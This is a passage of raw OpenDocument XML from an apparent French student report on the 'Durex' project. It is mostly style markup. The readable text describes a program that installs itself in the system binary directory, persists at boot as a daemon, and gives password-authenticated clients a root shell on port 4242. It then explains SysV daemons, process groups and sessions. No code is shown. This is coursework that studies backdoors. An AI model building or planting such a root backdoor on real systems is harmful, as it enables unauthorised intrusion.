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5DF0000054630532261.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700005C32000015EABD12915D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000011AD000003BA390F7A6D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000286A000014784C60A03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left"/>
    </style:style>
    <style:style style:name="Tableau1.A" style:family="table-column">
      <style:table-column-properties style:column-width="1.508cm"/>
    </style:style>
    <style:style style:name="Tableau1.B" style:family="table-column">
      <style:table-column-properties style:column-width="1.164cm"/>
    </style:style>
    <style:style style:name="Tableau1.C" style:family="table-column">
      <style:table-column-properties style:column-width="1.111cm"/>
    </style:style>
    <style:style style:name="Tableau1.D" style:family="table-column">
      <style:table-column-properties style:column-width="1.349cm"/>
    </style:style>
    <style:style style:name="Tableau1.E" style:family="table-column">
      <style:table-column-properties style:column-width="1.879cm"/>
    </style:style>
    <style:style style:name="Tableau1.F" style:family="table-column">
      <style:table-column-properties style:column-width="9.987cm"/>
    </style:style>
    <style:style style:name="Tableau1.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style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal"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style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P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style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>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10" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Footnote">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Tabl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21" style:family="paragraph" style:parent-style-name="Table_20_Contents">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ff0007" fo:font-style="italic" style:text-underline-style="none" fo:font-weight="bold" fo:background-color="#0f140f" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ff0007" fo:font-style="italic" fo:font-weight="bold" fo:background-color="#0f140f"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" fo:line-height="125%" fo:background-color="transparent">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#000000" style:font-name="Times New Roman" fo:font-size="12pt" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" fo:line-height="125%" fo:background-color="transparent">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#000000" style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="P32"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3" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">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4" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">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5" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L31">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6" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L7">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37" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L8">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38" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L9">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39" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L3">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L11">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L12">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L13">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L14">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L22">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L23">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L28">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L29">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L21">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P52"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54" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L10">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L11">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L15">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L16">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L17">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L18">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L19">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L20">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal"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style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L5">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L24">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L25">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L26">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L5">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:text-underline-style="none" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L6">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L27">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L30">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" fo:text-align="justify" style:justify-single-word="false" fo:background-color="transparent" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" fo:font-weight="normal" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="11pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T3" style:family="text">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style:font-name="Courier New" fo:font-size="12pt" fo:font-style="normal" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-size-complex="12pt" style:font-style-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font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#cdcaa9" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:color="#ff0086" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:color="#ffffff"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:color="#008800" fo:font-style="italic" fo:background-color="#0f140f"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#fb660a" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:color="#0086f7" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#0086d2"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties style:text-underline-style="none"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:color="#000000"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:color="#000000" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-style="normal" style:font-size-asian="11pt" style:font-style-asian="normal" style:font-size-complex="11pt" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties style:font-name="Courier New"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UREX</text:p>
      <text:p text:style-name="P1">Projet 42</text:p>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list4234573823827808324" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P33">INTRODUCTION</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Le but du projet est de créer un programme qui va agir de la manière suivante.</text:p>
      <text:list xml:id="list1239780083173128192" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P40">A son lancement, il créera un autre programme, également nommé <text:span text:style-name="T6">durex</text:span>, situé dans le répertoire du système cible contenant ses binaires.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P40">Le programme ainsi créé devra être lancé en tâche de fond, comme un <text:span text:style-name="T6">daemon</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P40">Il devra également se lancer <text:span text:style-name="T6">au démarrage de la machine</text:span> infectée.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Le programme tournant en tâche de fond devra effectuer les actions suivantes :</text:p>
      <text:list xml:id="list113182091593652468" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P41">Écouter sur le port 4242 et accepter des connexions entrantes.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P41">Permettre à <text:span text:style-name="T6">3 clients</text:span> maximum de se connecter au programme.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P41">Lorsqu'un client arrive, un mot de passe lui est demandé pour poursuivre. Un minimum de sécurité est exigée pour le mot de passe, qui ne doit pas apparaître en clair dans le code source.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P41">Lorsque le client est authentifié, il peut lancer la <text:span text:style-name="T6">commande "shell"</text:span> pour que le daemon lance une shell root sur le même port (4242). Le programme originel n'est alors plus accessible, lorsqu'on se connecte sur le port 4242, c'est une shell root qui est lancée.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Dans le cadre de mon implémentation, lorsqu'un client demande le lancement d'une shell, la connexion avec tous les clients actuellement connectés est fermée. Ils peuvent ensuite se reconnecter au port 4242 pour accéder à une shell. Seules 3 shells peuvent être lancées en même temps (ce qui n'est pas explicitement demandé par le sujet, c'est un ajout).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Le daemon restera en mode "<text:span text:style-name="T6">shell</text:span>" jusqu'à ce que la dernière shell lancée par un utilisateur ait quitté. Lorsque cela arrive, il repasse en mode "<text:span text:style-name="T6">daemon</text:span>" classique, et les clients peuvent de nouveau se connecter via mot de passe, requérir le basculement en mode shell.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Avant de passer à l'implémentation elle-même, voici une définition rapide des <text:span text:style-name="T6">daemons</text:span> :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">"<text:span text:style-name="T7">Daemons are long running processes that run in the background with no controlling terminal - tty. Use cases for daemons are when the program needs to be available at all times and managed by the scheduler. Popular examples are nginx, postfix, httpd, sshd, cron, inetd. Many of these end in 'd', which is a convention for the name of a daemon. Daemons typically do not have the ability to write to </text:span><text:span text:style-name="Source_20_Text">stdout</text:span>, <text:span text:style-name="T7">or</text:span> <text:span text:style-name="Source_20_Text">stderr</text:span>, <text:span text:style-name="T7">and have no means to connect to</text:span> <text:span text:style-name="Source_20_Text">stdin</text:span><text:span text:style-name="T7"> because they have no controlling terminal. Having no controlling terminal is a big deal in daemons. If they could connect to a controlling terminal they could be used in nefarious ways. We guarantee the daemon cannot take on a controlling terminal by doing the so-called 'double fork'. Usually, output from the daemon is done by writing to log files. These logs are typically written in the in</text:span> <text:span text:style-name="Source_20_Text">/var/log</text:span> <text:span text:style-name="T7">directory. Input to a daemon, when necessary, is typically through sockets and signals</text:span>".</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list8957952234922644004" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P34">OLD-STYLE DUREX DAEMON</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P7">La première implémentation de Durex se situe dans le dossier <text:span text:style-name="T6">Durex_bind_oldstyle</text:span>. Il est appelé ainsi car il implémente l'<text:span text:style-name="T6">ancienne façon de créer des daemons</text:span>. Notons que ce n'est <text:span text:style-name="T6">pas la façon recommandée de créer des daemons</text:span>, il est préférable aujourd'hui d'utiliser les <text:span text:style-name="T7">new-style</text:span><text:span text:style-name="T9"> daemons implémentés par systemd. Cependant, le sujet semblait plutôt utiliser des </text:span><text:span text:style-name="T7">old-style</text:span><text:span text:style-name="T9">, et cette implémentation manuelle permet de mieux comprendre le fonctionnement interne des daemons, il </text:span><text:soft-page-break/><text:span text:style-name="T9">s'agit donc d'un bon exercice.</text:span></text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">La documentation complète concernant la différence entre les <text:span text:style-name="T7">old-style</text:span><text:span text:style-name="T9"> daemons et </text:span><text:span text:style-name="T7">new-style</text:span><text:span text:style-name="T9"> daemons est présentée ici :</text:span></text:p>
      <text:p text:style-name="P7"><text:a xlink:type="simple" xlink:href="https://man7.org/linux/man-pages/man7/daemon.7.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">https://man7.org/linux/man-pages/man7/daemon.7.html</text:span></text:a><text:span text:style-name="T9"> </text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9">Tutoriels :</text:span></text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="http://www.netzmafia.de/skripten/unix/linux-daemon-howto.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://www.netzmafia.de/skripten/unix/linux-daemon-howto.html</text:a> (basique, no double-fork)</text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://nullraum.net/how-to-create-a-daemon-in-c/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://nullraum.net/how-to-create-a-daemon-in-c/</text:a> (good)</text:p>
      <text:p text:style-name="P7"><text:a xlink:type="simple" xlink:href="https://lloydrochester.com/post/c/unix-daemon-example/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">https://lloydrochester.com/post/c/unix-daemon-example/</text:span></text:a><text:span text:style-name="T9"> (explications).</text:span></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P7"><text:span text:style-name="T9">Les daemons </text:span><text:span text:style-name="T7">old-style</text:span><text:span text:style-name="T9"> sont les daemons compatibles </text:span><text:span text:style-name="T10">SysV</text:span><text:span text:style-name="T9">. Ils doivent </text:span><text:span text:style-name="T10">se daemoniser eux-mêmes</text:span><text:span text:style-name="T9">, en suivant un certain nombre d'étapes décrites dans le lien ci-dessus. Avant de commencer l'explication des étapes et pour bien les comprendre, quelques définitions supplémentaires :</text:span></text:p>
      <text:list xml:id="list3117162706637112176" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P63"><text:span text:style-name="T10">Process group</text:span><text:span text:style-name="T9"> : comme le nom l'indique, un </text:span><text:span text:style-name="T7">process group</text:span><text:span text:style-name="T9"> est un ensemble de processus (un ou plusieurs). Quand un signal est dirigé vers un </text:span><text:span text:style-name="T7">process group</text:span><text:span text:style-name="T9">, il est communiqué à tous les processus de ce groupe. Les </text:span><text:span text:style-name="T7">process groups</text:span><text:span text:style-name="T9"> sont identifiés par leur </text:span><text:span text:style-name="T4">PGID</text:span><text:span text:style-name="T9">.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67"><text:span text:style-name="T9">Process group leader</text:span><text:span text:style-name="T11"> : le premier processus du groupe. Le PGID du groupe équivaut à son PID. Rien ne requiert qu'un </text:span><text:span text:style-name="T8">process group</text:span><text:span text:style-name="T11"> ait un leader, celui-ci peut tout à fait terminer, et le </text:span><text:span text:style-name="T8">process group</text:span><text:span text:style-name="T11"> n'aura plus de leader.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P67"><text:span text:style-name="T9">Session</text:span><text:span text:style-name="T11"> : une session est un ensemble de un ou plusieurs </text:span><text:span text:style-name="T8">process groups</text:span><text:span text:style-name="T11">. Lorsqu'un utilisateur se connecte, une session est créée, à laquelle vont appartenir les différents processus qu'il va lancer. Lorsqu'il se déconnecte, les processus associés à sa session seront interrompus. Les sessions sont identifiées par leur </text:span><text:span text:style-name="T3">SID</text:span><text:span text:style-name="T11">.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P52"/>
